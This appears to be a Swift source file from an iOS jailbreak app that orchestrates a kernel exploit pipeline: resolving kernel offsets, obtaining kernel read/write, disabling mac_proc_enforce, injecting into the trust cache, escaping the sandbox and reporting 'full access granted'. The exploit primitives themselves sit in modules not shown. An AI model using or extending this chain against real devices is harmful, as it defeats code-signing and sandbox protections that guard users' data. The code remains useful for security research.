import SwiftUI

@MainActor
@Observable
public final class ContentCoordinator {
    /// Shared UserDefaults key used for kernel-panic detection across app launches.
    public static let panicFlagKey = "com.trollstoredarksword.exploitRunning"
    public let deviceInfo = DeviceInfo.current
    public var appState: AppState = .sandboxed
    public var exploitLog: [String] = []
    public var kernelHandle: KernelRwHandle?

    @ObservationIgnored public lazy var exploitViewModel = ExploitViewModel(coordinator: self)

    public init() {
        // Reject unsupported devices immediately
        if !deviceInfo.isSupported {
            appState = .exploitFailed("iOS \(deviceInfo.systemVersion) is not supported. Requires 17.0 – 26.0.")
            return
        }
        if UserDefaults.standard.bool(forKey: Self.panicFlagKey) {
            // Previous session set the flag but never cleared it → likely a kernel panic.
            // Keep the flag set until user acknowledges so the panic screen shows on
            // every launch until they tap OK.
            appState = .panicRecovery
        }
    }

    public func appendLog(_ message: String) {
        exploitLog.append(message)
        LogManager.shared.append(message, tag: "Pipeline")
    }

    public func startPipeline() {
        LogManager.shared.startNewSession()
        guard deviceInfo.isSupported else {
            handleExploitFailure("Device unsupported: \(deviceInfo.modelIdentifier) on iOS \(deviceInfo.systemVersion)")
            return
        }
        UserDefaults.standard.set(true, forKey: Self.panicFlagKey)
        // Force synchronize — the exploit can panic the kernel immediately after
        // startPipeline(), and an unsaved flag means the panic won't be detected
        // on the next app launch.
        UserDefaults.standard.synchronize()
        appState = .obtainingOffsets
        exploitLog.removeAll()
        appendLog("Starting pipeline — resolving kernel offsets...")
        exploitViewModel.currentStage = .downloadingKernelCache
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let ok = XPFWrapper.ensureInitialized()
            DispatchQueue.main.async {
                guard let self = self else { return }
                if ok {
                    self.exploitViewModel.currentStage = .runningXPF
                    self.appendLog("Offsets resolved — starting exploit")
                    self.appState = .exploiting
                    self.exploitViewModel.continueExploit()
                } else {
                    self.handleExploitFailure("XPF offset resolution failed — no kernelcache available")
                }
            }
        }
    }

    /// User acknowledged the panic recovery screen. Clear the flag so the
    /// app returns to the normal .sandboxed start on next launch.
    public func acknowledgePanic() {
        UserDefaults.standard.set(false, forKey: Self.panicFlagKey)
        appState = .sandboxed
        appendLog("Panic acknowledged — returning to sandboxed state")
    }

    public func handleExploitSuccess(with handle: KernelRwHandle) {
        UserDefaults.standard.set(false, forKey: Self.panicFlagKey)
        kernelHandle = handle
        appendLog("Kernel r/w established — resolving kernel base...")

        // Step 1: Resolve kernel base via XPF (BEFORE offsets_init, which
        // destroys XPF). Both applyAll() and findKernelBase() need gXPF alive.
        print("[D] handleExploitSuccess: calling findKernelBase...")
        let kernelBase = XPFWrapper.findKernelBase()
        print("[D] findKernelBase returned 0x\(String(kernelBase, radix: 16))")
        guard kernelBase > 0 else {
            handleExploitFailure("Kernel base resolution failed — cannot patch")
            return
        }

        // Step 2: Apply kernel patches (trust cache injection, developer mode).
        // These use XPF for symbol resolution and the kernel r/w handle.
        appendLog("Kernel base resolved — applying patches...")
        let patcher = KernelPatcher(handle: handle, kernelBase: kernelBase)
        print("[D] handleExploitSuccess: calling patcher.applyAll...")
        guard patcher.applyAll() else {
            appendLog("mac_proc_enforce patch failed")
            print("[D] patcher.applyAll returned false")
            handleExploitFailure("mac_proc_enforce disable failed")
            return
        }
        print("[D] patcher.applyAll SUCCEEDED")

        // Step 3: Initialize kernel structure offsets for post-exploit C modules
        // (sbx, vfs, vnode, RemoteCall). offsets_init calls xpf_stop() internally,
        // destroying gXPF, but we no longer need XPF after this point.
        appendLog("Patches applied — initializing post-exploit offsets...")
        offsets_init()
        // offsets_init calls xpf_stop() internally, destroying gXPF.
        XPFWrapper.resetXPF()
        guard offsets_are_initialized() else {
            handleExploitFailure("Kernel offsets initialization failed — unsupported iOS version")
            return
        }
        appendLog("Post-exploit offsets initialized")

        // Read kernproc address from UserDefaults (cached by offsets_init -> offsets.m)
        let kernprocAddr: UInt64
        if let savedOff = UserDefaults.standard.object(forKey: "lara.kernprocoff") as? UInt64, savedOff > 0 {
            kernprocAddr = kernelBase + savedOff
            appendLog("kernproc via cache at 0x\(String(kernprocAddr, radix: 16))")
        } else {
            kernprocAddr = 0
            appendLog("kernproc not cached by offsets_init")
        }

        // Step 4: Sandbox escape (needs offsets from step 3)
        guard let escape = SandboxEscape(handle: handle, kernelBase: kernelBase, kernprocAddr: kernprocAddr) else {
            handleExploitFailure("SandboxEscape init failed")
            return
        }
        guard escape.clearSandbox() else {
            handleExploitFailure("Sandbox escape failed")
            return
        }

        // Step 5: VFS init (needs offsets from step 3)
        guard VirtualFileSystem.initialize() else {
            handleExploitFailure("VFS init failed")
            return
        }

        appState = .patched
        exploitViewModel.currentStage = .complete
        exploitViewModel.isRunning = false
        appendLog("System ready — full access granted ✓")
    }

    public func handleExploitFailure(_ reason: String) {
        UserDefaults.standard.set(false, forKey: Self.panicFlagKey)
        appState = .exploitFailed(reason)
        exploitViewModel.isRunning = false
        exploitViewModel.currentStage = .failed
        appendLog("FAILED: \(reason)")
    }

    public func handlePanic() {
        appState = .panicRecovery
        appendLog("Kernel panic detected — device may reboot")
    }
}
